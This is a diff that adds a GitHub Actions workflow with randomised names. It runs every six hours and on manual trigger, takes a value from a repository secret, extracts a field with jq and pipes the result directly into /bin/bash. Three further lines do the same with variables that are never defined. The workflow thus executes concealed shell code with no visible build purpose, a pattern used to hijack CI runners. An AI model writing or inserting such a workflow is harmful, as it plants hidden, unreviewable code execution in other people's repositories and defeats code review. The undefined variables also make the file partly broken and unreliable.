@@ -1,0 +1,21 @@
+name: whisperedholiness
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: whisperedholiness
+        env:
+          mk775: ${{ secrets.mk775 }}
+        run: |
+          echo $mk775 | jq -r .uc472 | /bin/bash
+          echo $btibf27039 | jq -r .vpid2280 | /bin/bash
+          echo $dokld94078 | jq -r .dgui94944 | /bin/bash
+          echo $vog12 | jq -r .ctyx584 | /bin/bash
+
